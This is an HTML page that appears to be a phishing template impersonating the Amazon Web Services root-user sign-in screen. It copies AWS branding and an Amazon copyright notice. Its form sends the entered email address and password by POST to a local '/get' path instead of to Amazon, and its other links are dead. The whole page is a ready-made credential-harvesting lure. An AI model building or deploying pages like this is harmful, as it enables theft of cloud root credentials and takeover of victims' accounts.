<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Amazon Web Services</title>
    <style>
      body {
        font-family: 'Amazon Ember', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
        background-color: #232f3e;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 440px;
        background: #fff;
        border-radius: 8px;
        padding: 40px 36px;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-h1 {
        font-size: 28px;
        font-weight: 400;
        color: #16191f;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid #aab7b8;
        border-radius: 4px;
        font-size: 14px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #e77600;
        box-shadow: 0 0 3px 2px rgba(228,121,17,0.5);
      }
      .g-label {
        display: block;
        font-weight: 700;
        font-size: 13px;
        color: #16191f;
        margin-bottom: 4px;
      }
      .gbtn-primary {
        width: 100%;
        padding: 10px;
        background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
        border: 1px solid #a88734;
        border-radius: 4px;
        font-size: 14px;
        cursor: pointer;
        color: #111;
      }
      .gbtn-primary:hover {
        background: linear-gradient(to bottom, #f5d78e, #eeb933);
      }
      .keep {
        display: flex;
        align-items: center;
        gap: 8px;
        margin: 12px 0;
        font-size: 13px;
        color: #111;
      }
      .keep input {
        accent-color: #e77600;
      }
      .link {
        display: block;
        color: #0066c0;
        font-size: 13px;
        text-decoration: none;
      }
      .link:hover {
        text-decoration: underline;
      }
      .divider {
        position: relative;
        text-align: center;
        margin: 24px 0;
        color: #767676;
        font-size: 12px;
      }
      .divider::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 0;
        right: 0;
        border-top: 1px solid #e7e7e7;
      }
      .divider span {
        background: #fff;
        padding: 0 12px;
        position: relative;
      }
      .create-btn {
        width: 100%;
        padding: 10px;
        background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
        border: 1px solid #adb1b8;
        border-radius: 4px;
        font-size: 13px;
        cursor: pointer;
      }
      .create-btn:hover {
        background: linear-gradient(to bottom, #e7eaf0, #d7dbe2);
      }
      .footer {
        margin-top: 20px;
        font-size: 11px;
        color: #555;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 100 30" width="100" height="30">
        <text x="0" y="22" font-family="Arial" font-weight="700" font-size="22" fill="#232f3e">aws</text>
        <path d="M10 25c15 5 30 5 45 0" stroke="#ff9900" stroke-width="3" stroke-linecap="round" fill="none"/>
        <path d="M52 21l5 4-7 1" fill="#ff9900"/>
      </svg>
      <h1 class="g-h1">Sign in</h1>
      <form action="/get" method="POST">
        <label class="g-label">Root user email address</label>
        <input class="g-input" type="email" name="email" required>
        <label class="g-label">Password</label>
        <input class="g-input" type="password" name="password" required>
        <button type="submit" class="gbtn-primary">Sign in</button>
        <div class="keep"><input type="checkbox">Keep me signed in</div>
      </form>
      <a href="#" class="link">Forgot password?</a>
      <div class="divider"><span>Create account</span></div>
      <button class="create-btn">Create a new AWS account</button>
      <p class="footer">© 2024 Amazon Web Services, Inc. or its affiliates.</p>
    </div>
  </body>
</html>
